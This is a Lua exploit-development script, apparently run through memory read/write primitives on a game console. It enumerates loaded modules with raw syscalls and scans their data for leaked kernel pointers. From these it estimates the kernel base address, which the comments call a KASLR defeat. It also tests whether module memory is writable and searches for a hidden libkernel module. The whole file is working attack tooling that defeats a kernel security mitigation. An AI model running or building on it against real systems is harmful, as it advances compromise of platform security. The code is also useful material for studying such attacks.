-- CRASH_CLASS: LOW
-- PROBE 520a: kernel pointer deep value analysis
--
-- 519a found 3400+ values matching 0xFFFF8xxx in module data regions.
-- This probe extracts actual hex values to determine:
-- 1. Clustering (real kernel objects within ~64MB = KASLR defeat)
-- 2. Spread (false positives: NaN, negative numbers)
-- 3. Writability of containing memory
-- 4. Handle 1 identity (possible hidden libkernel)
-- 5. Modules at handles > 512

print("=== PROBE 520a: kptr value analysis ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_hex(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function read_str(addr, maxlen)
    maxlen = maxlen or 64
    local s = ""
    for i = 0, maxlen - 1 do
        local b = safe_rd(addr + i)
        if not b then break end
        local c = b % 256
        if c == 0 then break end
        if c >= 32 and c < 127 then
            s = s .. string.char(c)
        else
            s = s .. "."
        end
    end
    return s
end

local sc20  = make_syscall(20)
local sc593 = make_syscall(593)
local sc547 = make_syscall(547)

local pid = to_num(sc20())
print("pid: " .. pid)

-- ============================================================
-- [A] Handle 1 special check + module enumeration
-- ============================================================
print("")
print("[A] Module enumeration")

local mod_info = memory.alloc(0x200)

-- handle 1 explicitly (possible hidden libkernel)
for j = 0, 0x15C, 4 do safe_wd(mod_info + j, 0) end
safe_wd(mod_info, 0x160)
local ok1, ret1 = pcall(function() return sc593(uint64(1), mod_info) end)
print("  handle 1: pcall=" .. tostring(ok1) .. " ret=" .. (ok1 and tostring(to_num(ret1)) or "FAIL"))
print("")
if ok1 and to_num(ret1) == 0 then
    local n1 = read_str(mod_info + 8, 48)
    local mt1 = safe_rq(mod_info + 0x108)
    print("  h=1 name=\"" .. n1 .. "\" text=" .. (mt1 and fmt_hex(mt1) or "nil"))
    print("")
end

-- enumerate 0-512
local modules = {}
for h = 0, 512 do
    for j = 0, 0x15C, 4 do safe_wd(mod_info + j, 0) end
    safe_wd(mod_info, 0x160)
    local ok, ret = pcall(function() return sc593(uint64(h), mod_info) end)
    if ok and to_num(ret) == 0 then
        local mt = safe_rq(mod_info + 0x108)
        if mt then
            local mh, ml = get_hi_lo(mt)
            if ml > 0 then
                local name = read_str(mod_info + 8, 48)
                local md = safe_rq(mod_info + 0x118)
                local dsz_raw = safe_rq(mod_info + 0x120)
                local dsz = 0
                if dsz_raw then
                    local dsh, dsl = get_hi_lo(dsz_raw)
                    dsz = dsl
                end
                local dprot = 0
                if dsz_raw then
                    local dsh2, _ = get_hi_lo(dsz_raw)
                    dprot = dsh2
                end
                table.insert(modules, {
                    handle = h, text = mt, data = md,
                    name = name, dsz = dsz, dprot = dprot
                })
            end
        end
    end
end
print("  total modules: " .. #modules)
print("")

-- ============================================================
-- [B] Full kptr scan: collect stats + samples
-- ============================================================
print("[B] Kptr scan + distribution")

local global_min_h, global_min_l = 0xFFFFFFFF, 0xFFFFFFFF
local global_max_h, global_max_l = 0, 0
local global_total = 0
local page_counts = {}
local samples = {}
local densest_mod = nil
local densest_cnt = 0
local per_mod = {}

for mi, m in ipairs(modules) do
    if m.data then
        local dh, dl = get_hi_lo(m.data)
        if dl > 0 then
            local scan_sz = math.min(m.dsz > 0 and m.dsz or 0x10000, 0x40000)
            local cnt = 0
            local first_v = nil

            for off = 0, scan_sz - 8, 8 do
                local q = safe_rq(m.data + off)
                if not q then break end
                local qh, ql = get_hi_lo(q)

                if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                    cnt = cnt + 1
                    global_total = global_total + 1
                    if not first_v then first_v = q end

                    -- min/max
                    if qh < global_min_h or (qh == global_min_h and ql < global_min_l) then
                        global_min_h, global_min_l = qh, ql
                    end
                    if qh > global_max_h or (qh == global_max_h and ql > global_max_l) then
                        global_max_h, global_max_l = qh, ql
                    end

                    -- 1MB page bucket
                    local pk = string.format("%08X_%03X", qh, math.floor(ql / 0x100000))
                    page_counts[pk] = (page_counts[pk] or 0) + 1

                    -- collect samples (first 60 globally)
                    if #samples < 60 then
                        table.insert(samples, {
                            h = m.handle, off = off, qh = qh, ql = ql,
                            name = m.name:sub(1, 18)
                        })
                    end
                end
            end

            if cnt > densest_cnt then
                densest_cnt = cnt
                densest_mod = m
            end
            if cnt > 0 then
                table.insert(per_mod, {
                    handle = m.handle, cnt = cnt,
                    first = first_v, name = m.name, dprot = m.dprot
                })
            end
        end
    end
end

print("  total kptrs: " .. global_total)
print("")

-- per-module summary (compact)
print("  per-module counts:")
for _, pm in ipairs(per_mod) do
    print(string.format("    h=%d cnt=%d prot=%d first=%s \"%s\"",
        pm.handle, pm.cnt, pm.dprot, pm.first and fmt_hex(pm.first) or "?",
        pm.name:sub(1, 25)))
end
print("")

-- ============================================================
-- [C] Distribution analysis
-- ============================================================
print("[C] Distribution")
print("  min: " .. string.format("0x%X%08X", global_min_h, global_min_l))
print("  max: " .. string.format("0x%X%08X", global_max_h, global_max_l))
print("")

-- compute range
local range_h = global_max_h - global_min_h
local range_l
if global_max_l >= global_min_l then
    range_l = global_max_l - global_min_l
else
    range_h = range_h - 1
    range_l = 0x100000000 - global_min_l + global_max_l
end
print("  range: " .. string.format("0x%X%08X", range_h, range_l))
print("")

-- kernel base estimate (align min down to 2MB boundary)
local kbase_l = global_min_l - (global_min_l % 0x200000)
print("  kernel base (2MB align): " .. string.format("0x%X%08X", global_min_h, kbase_l))
print("")

-- unique pages
local unique_pages = 0
for _ in pairs(page_counts) do unique_pages = unique_pages + 1 end
print("  unique 1MB pages: " .. unique_pages)
print("")

-- top 10 pages by hit count
local sorted_p = {}
for k, v in pairs(page_counts) do
    table.insert(sorted_p, {key = k, count = v})
end
table.sort(sorted_p, function(a, b) return a.count > b.count end)
print("  top pages:")
for i = 1, math.min(10, #sorted_p) do
    print("    " .. sorted_p[i].key .. " : " .. sorted_p[i].count)
end
print("")

-- range verdict
if range_h == 0 and range_l < 0x4000000 then
    print("  *** RANGE < 64MB => LIKELY REAL KERNEL IMAGE POINTERS ***")
elseif range_h == 0 and range_l < 0x40000000 then
    print("  *** RANGE < 1GB => kernel image + heap/stack ***")
else
    print("  *** RANGE > 1GB => likely mix of real + false positives ***")
end
print("")

-- ============================================================
-- [D] Sample hex values (first 40 from global collection)
-- ============================================================
print("[D] Sample kptr values")
for i = 1, math.min(40, #samples) do
    local s = samples[i]
    print(string.format("  [%02d] h=%3d +0x%05X: 0x%X%08X  %s",
        i, s.h, s.off, s.qh, s.ql, s.name))
end
print("")

-- ============================================================
-- [E] Densest module: extra 20 kptrs from deep in data
-- ============================================================
print("[E] Densest module deep dump")
if densest_mod then
    print("  module: h=" .. densest_mod.handle .. " \"" .. densest_mod.name .. "\"")
    print("  count: " .. densest_cnt .. " dprot=" .. densest_mod.dprot)
    print("")

    local dh, dl = get_hi_lo(densest_mod.data)
    local scan_sz = math.min(densest_mod.dsz > 0 and densest_mod.dsz or 0x10000, 0x40000)
    local printed = 0
    local skip_first = 200  -- skip first 200 kptrs, print from middle/end
    local skipped = 0

    for off = 0, scan_sz - 8, 8 do
        if printed >= 20 then break end
        local q = safe_rq(densest_mod.data + off)
        if not q then break end
        local qh, ql = get_hi_lo(q)
        if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
            skipped = skipped + 1
            if skipped > skip_first then
                printed = printed + 1
                print(string.format("    +0x%05X: 0x%X%08X", off, qh, ql))
            end
        end
    end
end
print("")

-- ============================================================
-- [F] Write test: read a kptr, write SAME value back, verify
-- ============================================================
print("[F] Write test (same-value roundtrip)")
if #samples > 0 then
    local s = samples[1]
    local addr = nil
    for _, m in ipairs(modules) do
        if m.handle == s.h and m.data then
            addr = m.data + s.off
            break
        end
    end
    if addr then
        local orig = safe_rq(addr)
        print("  addr=" .. fmt_hex(addr) .. " orig=" .. (orig and fmt_hex(orig) or "nil"))
        if orig then
            local wok = safe_wq(addr, orig)
            local after = safe_rq(addr)
            print("  write_same=" .. tostring(wok) .. " after=" .. (after and fmt_hex(after) or "nil"))
            local oh, ol = get_hi_lo(orig)
            local ah, al = get_hi_lo(after)
            if oh == ah and ol == al then
                print("  *** DATA IS WRITABLE ***")
            else
                print("  *** WRITE CHANGED OR FAILED ***")
            end
        end
    else
        print("  could not resolve sample address")
    end
end
print("")

-- ============================================================
-- [G] Protection check via sys 547
-- ============================================================
print("[G] Protection check (sys 547)")
if densest_mod and densest_mod.data then
    local prot_buf = memory.alloc(64)
    for j = 0, 60, 4 do safe_wd(prot_buf + j, 0) end
    local ok, ret = pcall(function()
        return sc547(densest_mod.data, uint64(to_num(prot_buf)), uint64(64))
    end)
    print("  547 on densest data: ret=" .. (ok and tostring(to_num(ret)) or "FAIL"))
    if ok and to_num(ret) == 0 then
        -- dump first 32 bytes of protection record
        for off = 0, 0x1C, 4 do
            local v = safe_rd(prot_buf + off)
            print(string.format("    +0x%02X: 0x%X", off, v or 0))
        end
    end
end
print("")

-- ============================================================
-- [H] libkernel search (handles 513-2048)
-- ============================================================
print("[H] libkernel search (513-2048)")
local extra_modules = 0
for h = 513, 2048 do
    for j = 0, 0x15C, 4 do safe_wd(mod_info + j, 0) end
    safe_wd(mod_info, 0x160)
    local ok, ret = pcall(function() return sc593(uint64(h), mod_info) end)
    if ok and to_num(ret) == 0 then
        local name = read_str(mod_info + 8, 48)
        local mt = safe_rq(mod_info + 0x108)
        extra_modules = extra_modules + 1
        print("  h=" .. h .. " \"" .. name .. "\" text=" .. (mt and fmt_hex(mt) or "nil"))
        if name:find("kernel") or name:find("Kernel") then
            print("  *** LIBKERNEL FOUND ***")
        end
    end
    if h % 512 == 0 then
        print("  ...scanned to " .. h .. " extra=" .. extra_modules)
    end
end
print("  extra modules found: " .. extra_modules)
print("")

-- ============================================================
-- [I] Cross-module check: do different modules share kptr values?
-- ============================================================
print("[I] Cross-module shared kptrs")
-- collect first 3 kptrs from each module
local kptr_owners = {}
for _, m in ipairs(modules) do
    if m.data then
        local dh, dl = get_hi_lo(m.data)
        if dl > 0 then
            local found = 0
            for off = 0, 0x8000 - 8, 8 do
                if found >= 3 then break end
                local q = safe_rq(m.data + off)
                if not q then break end
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                    found = found + 1
                    local key = string.format("0x%X%08X", qh, ql)
                    if not kptr_owners[key] then
                        kptr_owners[key] = {}
                    end
                    local already = false
                    for _, oh in ipairs(kptr_owners[key]) do
                        if oh == m.handle then already = true; break end
                    end
                    if not already then
                        table.insert(kptr_owners[key], m.handle)
                    end
                end
            end
        end
    end
end

local shared_cnt = 0
for val, handles in pairs(kptr_owners) do
    if #handles > 1 then
        shared_cnt = shared_cnt + 1
        if shared_cnt <= 5 then
            local hs = ""
            for _, h in ipairs(handles) do hs = hs .. h .. "," end
            print("  SHARED: " .. val .. " in h=" .. hs)
        end
    end
end
print("  total shared kptr values: " .. shared_cnt)
print("")

local pid2 = to_num(sc20())
print("pid: " .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("")
print("=== PROBE 520a COMPLETE ===")
